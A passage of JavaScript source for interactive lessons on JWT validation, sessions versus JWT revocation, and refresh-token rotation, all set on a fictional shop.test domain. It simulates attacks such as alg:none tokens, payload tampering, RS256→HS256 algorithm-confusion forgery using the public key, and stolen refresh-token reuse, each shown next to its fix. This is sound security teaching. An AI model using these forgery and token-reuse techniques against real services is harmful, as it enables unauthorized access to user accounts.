$('#tk').innerHTML = Object.keys(TOKENS).map((k) => '<option value="' + k + '">' + TOKENS[k].name + '</option>').join('');
const WHY = {
  none: 'alg:none means "unsecured JWT". Some old libraries treated it as valid. Pinning the algorithm rejects it.',
  tamper: 'Only the signature protects the payload. Turn off "verify signature" and anyone can be admin.',
  confusion: 'The key is the RSA PUBLIC key (everyone can download it). If the library lets the token pick HS256, it uses that public key as an HMAC secret, which the attacker also has. Pinning the algorithm stops it.',
  expired: 'A perfectly signed token that is too old. Without the exp check, a stolen token works forever.',
  nbf: 'nbf = not before. Rarely used, but should be honoured.',
  aud: 'Signed by the same IdP, but issued for the Billing API. Without the aud check, a token for one API works on all of them.',
  iss: 'Signature valid because the key was reused across environments. The iss check is your second line of defence.',
  valid: 'All checks pass. Only now should the API look at role/scope for authorization.',
};
function run() {
  const cfg = {};
  CHECKS.forEach((c) => (cfg[c[0]] = $('#c_' + c[0]).checked));
  const key = $('#tk').value, t = TOKENS[key].t;
  $('#col').innerHTML = colorJwt(t);
  const r = validate(t, cfg);
  $('#dc').textContent = r.d ? 'header  ' + JSON.stringify(r.d.header) + NL + 'payload ' + JSON.stringify(r.d.payload, null, 1) : '';
  let stopped = false;
  $('#tr').innerHTML = r.st.map((s) => {
    let icon = !s.on ? '⏭ ' : s.ok ? (s.text.includes('⚠') ? '⚠️ ' : '✅ ') : '❌ ';
    const html = '<li style="opacity:' + (stopped || !s.on ? 0.4 : 1) + '">' + icon + esc(s.text) + (!s.on ? ' (check OFF)' : '') + '</li>';
    if (s.on && !s.ok) stopped = true;
    return html;
  }).join('');
  const accepted = !r.fail;
  const attack = key !== 'valid';
  $('#vd').innerHTML = '<div class="verdict ' + (accepted === !attack ? 'ok' : 'bad') + '">' + (accepted ? 'ACCEPT → request runs as ' + r.d.payload.sub + ' (role ' + r.d.payload.role + ')' + (attack ? ' 😱' : '') : 'REJECT → 401 invalid_token (failed: ' + r.fail + ')') + '</div>';
  $('#why').textContent = WHY[key];
}
$('#all').onclick = () => { CHECKS.forEach((c) => ($('#c_' + c[0]).checked = true)); run(); };
$('#naive').onclick = () => { CHECKS.forEach((c) => ($('#c_' + c[0]).checked = c[0] === 'sig' || c[0] === 'exp')); run(); };
document.addEventListener('change', run);
run();
</script>`;

  const algConfusionFlow = CSS + `
<div id="flow"></div>
<script>
` + H + TOKENS_JS + `
const evil = TOKENS.confusion.t;
const sig = evil.split('.')[2];
const req = ['GET /admin/users HTTP/1.1', 'Host: api.shop.test', 'Authorization: Bearer ' + evil.slice(0, 50) + '…'].join(NL);
const A = [
  { id: 'x', label: 'Attacker', icon: '🦹', store: {}, storeLabel: 'Attacker' },
  { id: 'i', label: 'idp.shop.test', icon: '🔑', store: { 'RS256 private key': '🔒 never leaves' }, storeLabel: 'IdP' },
  { id: 'a', label: 'api.shop.test', icon: '🛒', store: { 'verification key': 'IdP RSA public key (PEM)' }, storeLabel: 'API config' },
];
const prep = [
  { from: 'x', to: 'i', label: 'GET /.well-known/jwks.json', msg: ['GET /.well-known/jwks.json HTTP/1.1', 'Host: idp.shop.test'].join(NL), note: 'Public keys are public: anyone can download them. That is fine… normally.' },
  { from: 'i', to: 'x', kind: 'res', label: 'RSA public key', msg: ['HTTP/1.1 200 OK', '', '# converted to PEM:', PUB].join(NL), set: { x: { 'public key': 'PEM (same bytes the API has)' } } },
  { from: 'x', to: 'x', label: 'forge: alg=HS256, HMAC(key = public PEM)', badge: 'Forge',
    msg: ['header  = {"alg":"HS256","typ":"JWT","kid":"2026-10-rsa"}', 'payload = {"sub":"alice","role":"admin", …}', '', 'signature = HMAC-SHA256(secret = PEM text of the PUBLIC key, header.payload)', '          = ' + sig].join(NL), hl: ['HS256', 'PUBLIC'],
    note: 'Real HMAC computed live. The attacker treats the public key bytes as if they were an HS256 shared secret.' },
  { from: 'x', to: 'a', label: 'GET /admin/users  Bearer (forged)', msg: req, hl: ['Bearer'] },
];
Seq.mount('#flow', {
  title: 'Algorithm confusion: RS256 → HS256',
  actors: A,
  scenarios: [
    { name: '😱 Vulnerable: library trusts header alg', steps: prep.concat([
      { from: 'a', to: 'a', label: 'jwt.verify(token, publicKeyPem)', badge: 'Bug',
        msg: ['// server code', 'jwt.verify(token, publicKeyPem)   // no algorithms option', '', '# library reads header.alg = "HS256"', '# → HMAC-SHA256(publicKeyPem, header.payload)', '#   = ' + Auth.hmacSha256b64url(PUB, evil.split('.').slice(0, 2).join('.')), '# == signature in token ✓'].join(NL), hl: ['HS256'],
        note: 'The same <code>key</code> variable is used as an RSA public key for RS256 and as an HMAC secret for HS256. The token chose HS256, so the attacker\\'s HMAC matches.' },
      { from: 'a', to: 'x', kind: 'res', label: '200 OK as admin 😱', msg: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', '[{"id":"alice"},{"id":"bob"},…]'].join(NL) },
    ]) },
    { name: '🛡 Fixed: algorithm pinned', steps: prep.concat([
      { from: 'a', to: 'a', label: 'jwt.verify(token, key, {algorithms:["RS256"]})', badge: 'Pinned',
        msg: ['// server code', 'jwt.verify(token, publicKeyPem, { algorithms: ["RS256"] })', '', '# header.alg = "HS256" not in ["RS256"] → throw'].join(NL), hl: ['algorithms'],
        note: 'The server decides the algorithm. The token\\'s <code>alg</code> must match it. Modern libraries also refuse to use an RSA/EC key object for HMAC.' },
      { from: 'a', to: 'x', kind: 'err', label: '401 invalid_token', msg: ['HTTP/1.1 401 Unauthorized', 'WWW-Authenticate: Bearer error="invalid_token",', '    error_description="unexpected alg"'].join(NL) },
    ]) },
  ],
});
</script>`;

  const validationExercise = (solved) => CSS + `
<div class="card">
  <h4>Which check rejects each token? (the API checks in this order: alg → signature → exp → nbf → iss → aud)</h4>
  <div class="mut">Server config: alg RS256 · iss <code>https://idp.shop.test</code> · aud <code>https://api.shop.test</code> · now = <b id="now"></b></div>
  <table class="t" id="tb" style="margin-top:6px"></table>
  <button id="chk" style="margin-top:6px">Check</button>
  <div id="fb" class="fb"></div>
</div>
<script>
` + H + TOKENS_JS + `
$('#now').textContent = NOW;
const CASES = [
  ['A', RS({}, { exp: NOW - 30, aud: 'https://billing.shop.test' }), 'exp'],
  ['B', TOKENS.none.t, 'alg'],
  ['C', RS({}, { aud: ['https://api.shop.test', 'https://billing.shop.test'] }), 'accept'],
  ['D', RS({}, { iss: 'https://idp.shop.test/', exp: NOW + 300 }), 'iss'],
  ['E', TOKENS.tamper.t, 'sig'],
];
const OPTS = [['alg', 'alg'], ['sig', 'signature'], ['exp', 'exp'], ['nbf', 'nbf'], ['iss', 'iss'], ['aud', 'aud'], ['accept', 'none: ACCEPT']];
const PRE = ` + (solved ? "['exp','alg','accept','iss','sig']" : "['','','','','']") + `;
const sigNote = (t) => { const r = validate(t, { pin: true, sig: true, exp: false, nbf: false, iss: false, aud: false }); return r.st[2].ok ? 'valid' : 'INVALID'; };
$('#tb').innerHTML = '<tr><th></th><th>header</th><th>payload</th><th>RS256 sig</th><th>first failing check</th></tr>' + CASES.map((c, i) => {
  const d = dec(c[1]);
  return '<tr><td><b>' + c[0] + '</b></td><td class="mono">' + esc(JSON.stringify(d.header)) + '</td><td class="mono" style="font-size:11px">' + esc(JSON.stringify(d.payload)) +
    '</td><td>' + (d.header.alg === 'RS256' ? sigNote(c[1]) : '—') + '</td><td><select id="s' + i + '"><option value="">choose…</option>' +
    OPTS.map((o) => '<option value="' + o[0] + '"' + (PRE[i] === o[0] ? ' selected' : '') + '>' + o[1] + '</option>').join('') + '</select></td></tr>';
}).join('');
const WHY = { A: 'exp comes before aud in the order, so exp fails first.', B: 'alg "none" is not in the allow-list.', C: 'aud may be an array; it contains our API.',
  D: 'iss must match exactly: the trailing slash makes it a different string.', E: 'The payload changed, so the RS256 signature no longer matches.' };
$('#chk').onclick = () => {
  let n = 0;
  const lines = CASES.map((c, i) => { const ok = $('#s' + i).value === c[2]; if (ok) n++; return (ok ? '✅ ' : '❌ ') + c[0] + ': ' + (ok ? WHY[c[0]] : 'look again'); });
  $('#fb').className = 'fb ' + (n === CASES.length ? 'ok' : 'bad');
  $('#fb').innerHTML = n + '/' + CASES.length + '<br>' + lines.join('<br>');
};
</script>`;

  // =====================================================================
  // sessions-vs-jwt
  // =====================================================================
  const revocationFlow = CSS + `
<div id="flow"></div>
<script>
` + H + `
const sid = 's%3A' + Auth.randB64url(18);
const jwt = Auth.jwtSign({ alg: 'HS256', typ: 'JWT' }, { sub: 'alice', jti: 'a81f-77', role: 'seller', iat: NOW, exp: NOW + 900 }, 'k');
const T = (m) => new Date((NOW + m * 60) * 1000).toISOString().slice(11, 16);
const A = (store) => [
  { id: 'b', label: 'Alice (browser)', icon: '🌐', store: store.b, storeLabel: 'Alice holds' },
  { id: 'a', label: 'API', icon: '🛒', store: store.a, storeLabel: 'API state' },
  { id: 'm', label: 'Admin', icon: '👮', store: {}, storeLabel: 'Admin' },
];
const getC = ['GET /account HTTP/1.1', 'Host: shop.test', 'Cookie: sid=' + sid].join(NL);
const getJ = ['GET /account HTTP/1.1', 'Host: api.shop.test', 'Authorization: Bearer ' + jwt.slice(0, 40) + '…'].join(NL);
const ok = (txt) => ({ from: 'a', to: 'b', kind: 'res', label: txt || '200 OK', msg: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', '{"user":"alice","role":"seller"}'].join(NL) });
const ban = (set, note) => ({ from: 'm', to: 'a', label: 'ban alice (' + T(1) + ')', msg: ['POST /admin/users/alice/ban HTTP/1.1', 'Host: api.shop.test', '', '{"reason":"fraud"}'].join(NL), set: set, note: note });
Seq.mount('#flow', {
  title: 'The revocation problem: ban a user, what happens to her next request?',
  actors: A({ b: { cookie: 'sid=' + sid.slice(0, 12) + '…' }, a: { sessions: sid.slice(0, 10) + '… → alice' } }),
  scenarios: [
    { name: '🍪 Server session', steps: [
      { from: 'b', to: 'a', label: 'GET /account  Cookie: sid', msg: getC, hl: ['sid='] },
      { from: 'a', to: 'a', label: 'look up session → alice', note: 'Every request hits the session store (Redis/DB).' },
      ok(),
      ban({ a: { sessions: null, 'users.alice': 'banned' } }, 'The admin action deletes all of Alice\\'s sessions.'),
      { from: 'b', to: 'a', label: 'GET /account (' + T(2) + ')', msg: getC },
      { from: 'a', to: 'a', label: 'session not found' },
      { from: 'a', to: 'b', kind: 'err', label: '401: kicked out instantly', msg: 'HTTP/1.1 401 Unauthorized', note: '✅ Revocation is immediate because the server holds the state.' },
    ]},
    { name: '🎫 Stateless JWT', actors: A({ b: { access_token: 'JWT exp ' + T(15) }, a: { 'trusts key': 'k' } }), steps: [
      { from: 'b', to: 'a', label: 'GET /account  Bearer JWT', msg: getJ },
      { from: 'a', to: 'a', label: 'verify signature + exp (no DB)', msg: JSON.stringify(dec(jwt).payload, null, 1) },
      ok(),
      ban({ a: { 'users.alice (in DB)': 'banned' } }, 'The DB now says banned, but the API does not read the DB when verifying JWTs.'),
      { from: 'b', to: 'a', label: 'GET /account (' + T(2) + ')', msg: getJ },
      { from: 'a', to: 'a', label: 'signature ✓ exp ✓ → still valid!', badge: 'Problem', note: 'The token is a signed statement "alice is a seller until ' + T(15) + '". Nobody can un-sign it.' },
      ok('200 OK 😱 banned user still in'),
      { from: 'b', to: 'a', label: 'GET /account (' + T(14) + ')', msg: getJ },
      ok('200 OK 😱 (13 minutes later)'),
      { from: 'b', to: 'a', label: 'GET /account (' + T(16) + ')', msg: getJ },
      { from: 'a', to: 'b', kind: 'err', label: '401 expired → refresh is refused', msg: ['HTTP/1.1 401 Unauthorized', 'WWW-Authenticate: Bearer error="invalid_token", error_description="expired"'].join(NL),
        note: 'Only at <code>exp</code> does access end, and then the refresh (which <i>does</i> check the DB) fails. That is why access tokens are kept short (5–15 min).' },
    ]},
    { name: '🧾 JWT + denylist', actors: A({ b: { access_token: 'JWT jti=a81f-77' }, a: { denylist: '(empty)' } }), steps: [
      { from: 'b', to: 'a', label: 'GET /account  Bearer JWT', msg: getJ },
      { from: 'a', to: 'a', label: 'verify + jti in denylist? no' },
      ok(),
      ban({ a: { denylist: 'a81f-77 (until ' + T(15) + ')' } }, 'Ban adds the token\\'s <code>jti</code> (or "all tokens for alice issued before now") to a denylist, kept only until the token\\'s own exp.'),
      { from: 'b', to: 'a', label: 'GET /account (' + T(2) + ')', msg: getJ },
      { from: 'a', to: 'a', label: 'jti a81f-77 is denylisted ✗', badge: 'Lookup' },
      { from: 'a', to: 'b', kind: 'err', label: '401 revoked', msg: ['HTTP/1.1 401 Unauthorized', 'WWW-Authenticate: Bearer error="invalid_token", error_description="revoked"'].join(NL),
        note: 'Works, but every API now does a lookup on every request: you have re-invented server state. Fine if the list is small and fast, but be honest about it.' },
    ]},
  ],
});
</script>`;

  const compareWidget = CSS + `
<div class="g2">
  <div class="card">
    <h4>Your requirements</h4>
    <div id="req"></div>
    <div id="rec" style="margin-top:8px"></div>
  </div>
  <div class="card">
    <h4>Size on every request (real bytes)</h4>
    <div class="row"><label>permissions in token <input type="range" id="np" min="0" max="40" value="6"></label> <b id="npv"></b></div>
    <div id="bars"></div>
    <div class="mut">Browsers cap a single cookie at ~4096 bytes, and many servers/proxies reject request headers over 8–16 KB.</div>
  </div>
</div>
<div class="card">
  <table class="t">
    <tr><th></th><th>🍪 Server session (opaque id)</th><th>🎫 JWT (self-contained)</th></tr>
    <tr><td>State lives</td><td>Server store (Redis/DB)</td><td>Inside the token</td></tr>
    <tr><td>Revoke / logout</td><td class="ok">Instant: delete the row</td><td class="bad">Valid until exp (or add a denylist)</td></tr>
    <tr><td>Verify cost</td><td>Store lookup per request</td><td class="ok">Local signature check</td></tr>
    <tr><td>Many services / other domains</td><td>All must reach the store</td><td class="ok">Any service with the public key</td></tr>
    <tr><td>Stale data</td><td class="ok">Always fresh</td><td>Role change visible only after refresh</td></tr>
    <tr><td>XSS / CSRF exposure</td><td colspan="2">Depends on <b>where you store it</b> (HttpOnly cookie vs JS storage), not on the format. See the SPA storage lesson.</td></tr>
  </table>
</div>
<script>
` + H + `
const REQ = [
  ['instant', 'Must revoke access instantly (ban, "log out all devices")', 2, -2],
  ['one', 'One web app on one domain, server-rendered', 2, 0],
  ['micro', 'Many microservices / third-party APIs must verify', -1, 2],
  ['mobile', 'Native mobile apps or API clients (no browser cookies)', -1, 2],
  ['fresh', 'Permissions change often and must apply immediately', 2, -1],
];
$('#req').innerHTML = REQ.map((r) => '<label style="display:block"><input type="checkbox" id="r_' + r[0] + '"> ' + r[1] + '</label>').join('');
const sid = Auth.randB64url(32);
function render() {
  let s = 0, j = 0;
  const why = [];
  REQ.forEach((r) => { if ($('#r_' + r[0]).checked) { s += r[2]; j += r[3]; why.push(r[1]); } });
  let rec;
  if (!why.length) rec = '<span class="mut">Tick what applies.</span>';
  else if (s > j) rec = '<div class="verdict ok">🍪 Server-side session</div>';
  else if (j > s) rec = '<div class="verdict ok">🎫 Short-lived JWT access token + refresh token</div>';
  else rec = '<div class="verdict ok">Either: common combo is session for the browser + JWTs between services</div>';
  $('#rec').innerHTML = rec + (why.length && $('#r_instant').checked && j >= s ? '<div class="mut">You need instant revocation: keep access tokens ≤ 5 min or add a denylist / introspection.</div>' : '');
  const n = +$('#np').value;
  $('#npv').textContent = n;
  const perms = Array.from({ length: n }, (_, i) => ['orders', 'refunds', 'users', 'reports', 'invoices'][i % 5] + ':' + ['read', 'write', 'delete', 'export'][i % 4] + (i >= 20 ? ':' + i : ''));
  const t = Auth.jwtSign({ alg: 'RS256', typ: 'at+jwt', kid: '2026-10-rsa' }, { iss: 'https://idp.shop.test', sub: 'user_42', aud: 'https://api.shop.test', iat: NOW, exp: NOW + 900, jti: Auth.randHex(8), email: 'alice@example.com', roles: ['seller'], permissions: perms }, 'x');
  const jwtLen = t.split('.').slice(0, 2).join('.').length + 1 + 342; // + realistic RS256 signature length
  const items = [['Cookie: sid=…', ('Cookie: sid=' + sid).length], ['Authorization: Bearer <JWT>', 'Authorization: Bearer '.length + jwtLen]];
  const max = Math.max(4096, items[1][1]);
  $('#bars').innerHTML = items.map((it) => '<div class="mono" style="font-size:12px;margin-top:6px">' + it[0] + ' · <b>' + it[1] + ' bytes</b></div><div style="height:14px;border-radius:4px;background:' + (it[1] > 4096 ? '#dc2626' : '#087ea4') + ';width:' + Math.max(1, (it[1] / max) * 100) + '%"></div>').join('') +
    '<div style="border-left:2px dashed #dc2626;height:10px;margin-left:' + (4096 / max) * 100 + '%"></div><div class="mut" style="margin-left:' + Math.min(80, (4096 / max) * 100) + '%">4096</div>';
}
document.addEventListener('input', render);
document.addEventListener('change', render);
render();
</script>`;

  const sessExercise = (solved) => CSS + `
<div class="card">
  <h4>Choose the better default for each system</h4>
  <table class="t" id="tb"></table>
  <button id="chk" style="margin-top:6px">Check</button>
  <div id="fb" class="fb"></div>
</div>
<script>
` + H + `
const CASES = [
  ['A server-rendered online shop on one domain. Users expect "Log out of all devices" to work right away.', 's'],
  ['A mobile app calls 12 microservices behind a gateway. The company IdP issues the tokens.', 'j'],
  ['An internal bank admin panel. When an employee is fired, access must end within seconds.', 's'],
  ['A partner company\\'s server calls your public API on behalf of your users (OAuth).', 'j'],
];
const PRE = ` + (solved ? "['s','j','s','j']" : "['','','','']") + `;
$('#tb').innerHTML = '<tr><th>System</th><th>Choice</th></tr>' + CASES.map((c, i) => '<tr><td>' + c[0] + '</td><td><select id="s' + i + '"><option value="">choose…</option>' +
  '<option value="s"' + (PRE[i] === 's' ? ' selected' : '') + '>🍪 server session</option><option value="j"' + (PRE[i] === 'j' ? ' selected' : '') + '>🎫 short-lived JWT + refresh</option></select></td></tr>').join('');
const WHY = ['One domain + instant logout = sessions are simpler and revocable.', 'Many services verifying locally with the IdP public key: JWT access tokens shine.',
  'Instant revocation beats scalability here (or opaque tokens + introspection).', 'Delegated API access is what OAuth access tokens (often JWTs) are for.'];
$('#chk').onclick = () => {
  let n = 0;
  const lines = CASES.map((c, i) => { const ok = $('#s' + i).value === c[1]; if (ok) n++; return (ok ? '✅ ' : '❌ ') + (i + 1) + '. ' + (ok ? WHY[i] : 'think about revocation vs. number of verifiers'); });
  $('#fb').className = 'fb ' + (n === 4 ? 'ok' : 'bad');
  $('#fb').innerHTML = n + '/4<br>' + lines.join('<br>');
};
</script>`;

  // =====================================================================
  // refresh-tokens
  // =====================================================================
  const refreshFlow = CSS + `
<div id="flow"></div>
<script>
` + H + `
const RT1 = 'rt1_' + Auth.randB64url(20), RT2 = 'rt2_' + Auth.randB64url(20), RT3 = 'rt3_' + Auth.randB64url(20);
const AT = (n) => Auth.jwtSign({ alg: 'HS256', typ: 'at+jwt' }, { sub: 'alice', scope: 'orders:read', exp: NOW + n * 900, jti: 'at' + n }, 'k');
const s = (t) => t.slice(0, 10) + '…';
const refresh = (rt) => ['POST /token HTTP/1.1', 'Host: auth.shop.test', 'Content-Type: application/x-www-form-urlencoded', '',
  'grant_type=refresh_token&refresh_token=' + rt + '&client_id=shop-spa'].join(NL);
const pair = (at, rt) => ['HTTP/1.1 200 OK', 'Content-Type: application/json', 'Cache-Control: no-store', '',
  JSON.stringify({ access_token: s(at), token_type: 'Bearer', expires_in: 900, refresh_token: rt, scope: 'orders:read' }, null, 2)].join(NL);
const bad = ['HTTP/1.1 400 Bad Request', 'Content-Type: application/json', 'Cache-Control: no-store', '', '{"error":"invalid_grant","error_description":"refresh token revoked"}'].join(NL);
const api = (at) => ['GET /orders HTTP/1.1', 'Host: api.shop.test', 'Authorization: Bearer ' + s(at)].join(NL);
const ACT = (extra) => [
  { id: 'c', label: 'Alice\\'s app', icon: '📱', store: { access_token: 'AT1 (expired)', refresh_token: s(RT1) }, storeLabel: 'App' },
  { id: 'z', label: 'auth.shop.test', icon: '🔑', store: { 'family F1': 'RT1 active' }, storeLabel: 'Auth server: token family' },
  { id: 'a', label: 'api.shop.test', icon: '🛒' },
].concat(extra || []);
const X = { id: 'x', label: 'Attacker', icon: '🦹', store: {}, storeLabel: 'Attacker' };
const exp401 = [{ from: 'c', to: 'a', label: 'GET /orders  Bearer AT1', msg: api(AT(0)) },
  { from: 'a', to: 'c', kind: 'err', label: '401 invalid_token (expired)', msg: ['HTTP/1.1 401 Unauthorized', 'WWW-Authenticate: Bearer error="invalid_token",', '    error_description="The access token expired"'].join(NL),
    note: 'Access tokens are short-lived (here 15 min) so that a leaked one is useful only briefly.' }];
const cRefresh = (rt, label) => ({ from: 'c', to: 'z', label: label || 'POST /token  grant_type=refresh_token', msg: refresh(rt), hl: ['grant_type=refresh_token', 'refresh_token='],
  note: 'The refresh token goes <b>only</b> to the auth server, never to APIs. RFC 6749 §6.' });
Seq.mount('#flow', {
  title: 'Refresh tokens with rotation and reuse detection',
  actors: ACT(),
  scenarios: [
    { name: '✅ Normal refresh', steps: exp401.concat([
      cRefresh(RT1),
      { from: 'z', to: 'z', label: 'RT1 active → mark used, issue RT2', badge: 'Rotate', set: { z: { 'family F1': 'RT1 used → RT2 active' } },
        note: '<b>Rotation</b>: every refresh returns a brand-new refresh token and retires the old one.' },
      { from: 'z', to: 'c', kind: 'res', label: '200 new AT2 + RT2', msg: pair(AT(1), RT2), hl: ['refresh_token'], set: { c: { access_token: 'AT2 (15 min)', refresh_token: s(RT2) } } },
      { from: 'c', to: 'a', label: 'retry GET /orders  Bearer AT2', msg: api(AT(1)) },
      { from: 'a', to: 'c', kind: 'res', label: '200 OK', msg: ['HTTP/1.1 200 OK', '', '[{"id":101}]'].join(NL), note: 'The user noticed nothing.' },
    ]) },
    { name: '🦹 Stolen RT, victim refreshes first', actors: ACT([X]), steps: [
      { from: 'c', to: 'x', kind: 'info', label: 'RT1 stolen (malware / XSS)', badge: 'Theft', set: { x: { refresh_token: s(RT1) } } },
      cRefresh(RT1, 'victim: refresh with RT1'),
      { from: 'z', to: 'z', label: 'RT1 → used, issue RT2', set: { z: { 'family F1': 'RT1 used → RT2 active' } } },
      { from: 'z', to: 'c', kind: 'res', label: '200 AT2 + RT2', msg: pair(AT(1), RT2), set: { c: { access_token: 'AT2', refresh_token: s(RT2) } } },
      { from: 'x', to: 'z', label: 'attacker: refresh with RT1', msg: refresh(RT1), hl: [RT1] },
      { from: 'z', to: 'z', label: 'RT1 already used → REUSE! revoke family', badge: 'Reuse detected', set: { z: { 'family F1': 'ALL REVOKED (RT1, RT2)' } },
        note: 'A used refresh token should never come back. If it does, two parties hold copies, and the server cannot tell which is legit, so it kills the <b>whole family</b>.' },
      { from: 'z', to: 'x', kind: 'err', label: '400 invalid_grant', msg: bad },
      cRefresh(RT2, 'later: victim refreshes with RT2'),
      { from: 'z', to: 'c', kind: 'err', label: '400 invalid_grant → log in again', msg: bad, set: { c: { refresh_token: null } },
        note: 'The victim is logged out too: annoying but safe. Optionally alert the user / security team.' },
    ]},
    { name: '🦹 Attacker refreshes first', actors: ACT([X]), steps: [
      { from: 'c', to: 'x', kind: 'info', label: 'RT1 stolen', badge: 'Theft', set: { x: { refresh_token: s(RT1) } } },
      { from: 'x', to: 'z', label: 'attacker: refresh with RT1', msg: refresh(RT1), hl: [RT1] },
      { from: 'z', to: 'z', label: 'RT1 active → used, issue RT2 (to attacker!)', set: { z: { 'family F1': 'RT1 used → RT2 active' } }, note: 'The server cannot tell yet: this looks like a normal refresh.' },
      { from: 'z', to: 'x', kind: 'res', label: '200 AT2 + RT2', msg: pair(AT(1), RT2), set: { x: { refresh_token: s(RT2), access_token: 'AT2 (15 min)' } } },
      cRefresh(RT1, 'victim: refresh with RT1 (its copy)'),
      { from: 'z', to: 'z', label: 'RT1 already used → REUSE! revoke family', badge: 'Reuse detected', set: { z: { 'family F1': 'ALL REVOKED (RT1, RT2)' } },
        note: 'Now the <b>victim</b> trips the alarm, and the attacker\\'s RT2 dies with the family.' },
      { from: 'z', to: 'c', kind: 'err', label: '400 invalid_grant', msg: bad },
      { from: 'x', to: 'z', label: 'attacker: refresh with RT2', msg: refresh(RT2) },
      { from: 'z', to: 'x', kind: 'err', label: '400 invalid_grant', msg: bad, set: { x: { refresh_token: null } },
        note: 'The attacker keeps AT2 until it expires (≤ 15 min), then loses access. Without rotation they could refresh forever.' },
    ]},
  ],
});
</script>`;

  const familySim = CSS + `
<div class="row">
  <label><input type="checkbox" id="rot" checked> rotation</label>
  <label><input type="checkbox" id="reuse" checked> reuse detection</label>
  <span class="mut">clock: <b id="clk"></b> · access tokens live 15 min</span>
  <button id="rs">↺ restart</button>
</div>
<div class="g3">
  <div class="card"><h4>📱 Alice's app</h4><div id="cst" class="mono"></div>
    <button id="ca">call API</button><button id="cr">refresh</button></div>
  <div class="card"><h4>🦹 Attacker</h4><div id="xst" class="mono"></div>
    <button id="xs">steal app's current RT</button><button id="xr">refresh</button><button id="xa">call API</button></div>
  <div class="card"><h4>🔑 Auth server: family F1</h4><div id="fam"></div></div>
</div>
<div class="row"><button id="tick">⏩ +15 min</button></div>
<div class="card"><h4>Event log</h4><ol class="trace mono" id="log" style="max-height:220px;overflow:auto;font-size:12px"></ol></div>
<script>
` + H + `
let S;
function reset() {
  S = { t: 0, n: 1, fam: [{ id: 'RT1', st: 'active' }], c: { rt: 'RT1', at: 15 }, x: { rt: null, at: null }, log: [] };
  log('Alice logs in → AT (exp 0:15) + RT1');
}
const fmt = (m) => Math.floor(m / 60) + ':' + String(m % 60).padStart(2, '0');
function log(s, cls) { S.log.push('<li class="' + (cls || '') + '">[' + fmt(S.t) + '] ' + s + '</li>'); }
function render() {
  $('#clk').textContent = fmt(S.t);
  const who = (o) => 'RT: ' + (o.rt || '–') + '<br>AT: ' + (o.at == null ? '–' : o.at > S.t ? 'valid until ' + fmt(o.at) : '<span class="bad">expired</span>');
  $('#cst').innerHTML = who(S.c); $('#xst').innerHTML = who(S.x);
  $('#fam').innerHTML = '<table class="t mono"><tr><th>token</th><th>status</th></tr>' + S.fam.map((r) => '<tr><td>' + r.id + '</td><td><span class="pill ' +
    (r.st === 'active' ? 'ok' : r.st === 'used' ? 'mid' : 'bad') + '">' + r.st + '</span></td></tr>').join('') + '</table>';
  $('#log').innerHTML = S.log.join('');
  $('#log').scrollTop = 1e6;
}
function callApi(o, name) {
  if (o.at == null) log(name + ': GET /orders → no access token', 'bad');
  else if (o.at > S.t) log(name + ': GET /orders → 200 OK', 'ok');
  else log(name + ': GET /orders → 401 invalid_token (expired). Refresh needed.', 'bad');
}
function refresh(o, name) {
  if (!o.rt) { log(name + ': has no refresh token', 'bad'); return; }
  const row = S.fam.find((r) => r.id === o.rt);
  if (row.st === 'revoked') { log(name + ': POST /token ' + o.rt + ' → 400 invalid_grant (revoked)', 'bad'); o.rt = null; return; }
  if (row.st === 'used') {
    if ($('#reuse').checked) {
      S.fam.forEach((r) => (r.st = 'revoked'));
      log(name + ': POST /token ' + o.rt + ' → ' + o.rt + ' was ALREADY USED → reuse detected → whole family revoked → 400 invalid_grant', 'bad');
    } else {
      log(name + ': POST /token ' + o.rt + ' → already used → 400 invalid_grant (no reuse detection: the other holder keeps going)', 'bad');
    }
    o.rt = null;
    return;
  }
  o.at = S.t + 15;
  if ($('#rot').checked) {
    row.st = 'used';
    const id = 'RT' + ++S.n;
    S.fam.push({ id, st: 'active' });
    log(name + ': POST /token ' + o.rt + ' → 200 new AT (exp ' + fmt(o.at) + ') + ' + id + ' (' + row.id + ' marked used)', 'ok');
    o.rt = id;
  } else {
    log(name + ': POST /token ' + o.rt + ' → 200 new AT (exp ' + fmt(o.at) + '), same ' + o.rt + ' (no rotation)', 'ok');
  }
}
$('#ca').onclick = () => { callApi(S.c, '📱 app'); render(); };
$('#cr').onclick = () => { refresh(S.c, '📱 app'); render(); };
$('#xs').onclick = () => { S.x.rt = S.c.rt; log('🦹 attacker copies the app\\'s refresh token ' + (S.c.rt || '(none)'), 'bad'); render(); };
$('#xr').onclick = () => { refresh(S.x, '🦹 attacker'); render(); };
$('#xa').onclick = () => { callApi(S.x, '🦹 attacker'); render(); };
$('#tick').onclick = () => { S.t += 15; log('… 15 minutes pass'); render(); };
$('#rs').onclick = () => { reset(); render(); };
['#rot', '#reuse'].forEach((s) => $(s).addEventListener('change', () => { reset(); log('settings: rotation ' + ($('#rot').checked ? 'ON' : 'OFF') + ', reuse detection ' + ($('#reuse').checked ? 'ON' : 'OFF')); render(); }));
reset();
render();
</script>`;

  const refreshExercise = (solved) => CSS + `
<div class="card">
  <h4>Write the raw HTTP refresh request</h4>
  <div class="mut">Auth server <code>auth.shop.test</code>, token endpoint <code>/token</code>, public client <code>shop-spa</code>, refresh token <code>rt_8xKq2LmZ0pW</code>.</div>
  <textarea id="t" rows="6" style="margin-top:6px">${solved
    ? 'POST /token HTTP/1.1\nHost: auth.shop.test\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=refresh_token&refresh_token=rt_8xKq2LmZ0pW&client_id=shop-spa'
    : 'POST /token HTTP/1.1\nHost: auth.shop.test\nContent-Type: application/json\n\n{"refresh_token":"rt_8xKq2LmZ0pW"}'}</textarea>
  <button id="chk">Check</button>
  <div id="fb" class="fb"></div>
</div>
<script>
` + H + `
$('#chk').onclick = () => {
  const raw = $('#t').value.replace(/\\r/g, '');
  const i = raw.indexOf(NL + NL);
  const head = (i < 0 ? raw : raw.slice(0, i)).split(NL), body = i < 0 ? '' : raw.slice(i + 2).trim();
  const errs = [];
  if (!/^POST \\/token HTTP\\/1\\.1$/.test(head[0].trim())) errs.push('Line 1: <code>POST /token HTTP/1.1</code>');
  const hv = (n) => { const l = head.find((x) => x.toLowerCase().startsWith(n + ':')); return l ? l.slice(n.length + 1).trim() : null; };
  if (hv('host') !== 'auth.shop.test') errs.push('Header <code>Host: auth.shop.test</code>');
  if (!(hv('content-type') || '').startsWith('application/x-www-form-urlencoded')) errs.push('The token endpoint takes a form body: <code>Content-Type: application/x-www-form-urlencoded</code> (not JSON)');
  const q = new URLSearchParams(body);
